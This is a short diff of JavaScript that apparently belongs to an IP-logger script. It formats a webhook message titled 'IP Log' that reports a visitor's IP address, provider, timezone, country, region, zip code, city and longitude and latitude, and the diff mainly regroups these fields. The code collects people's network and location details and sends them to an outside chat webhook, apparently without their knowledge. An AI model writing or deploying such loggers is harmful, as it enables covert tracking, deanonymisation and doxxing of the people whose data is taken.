@@ -33,22 +33,18 @@ const request = async () => { // Calling a "synchronous" fetch
     postRequest.setRequestHeader('Content-type', 'application/json');
 
     var params = {
-        username: "IP Log",
+        username:   "IP Log",
         avatar_url: "",
         content:    "__**:globe_with_meridians: IP-Adress:**__ \n" 
-                    + ip + 
+                    + "`" + ip + "`" + 
                     "\n \n__**:telephone: Provider:**__ \n" 
                     + provider + 
                     "\n \n__**:map: Timezone:**__ \n" 
                     + timezone + 
-                    "\n \n__**:flag_" + countryCode + ": Country:**__ \n" 
-                    + country + 
-                    "\n \n __**:park: Region:**__ \n" 
-                    + region + 
-                    "\n \n__**:cityscape: Zip Code:**__ \n" 
-                    + zip + 
-                    "\n \n __**:cityscape: City:**__ \n" 
-                    + city + 
+                    "\n \n__**:flag_" + countryCode + ": Country and Region:**__ \n" 
+                    + country + " - " + region + 
+                    "\n \n__**:cityscape: Zip Code & City:**__ \n" 
+                    + zip + " " + city +
                     "\n \n__**:round_pushpin: Location:**__ \n" 
                     + "**Longitude:** " + lon + "\n"
                     + "**Latitude:** " + lat
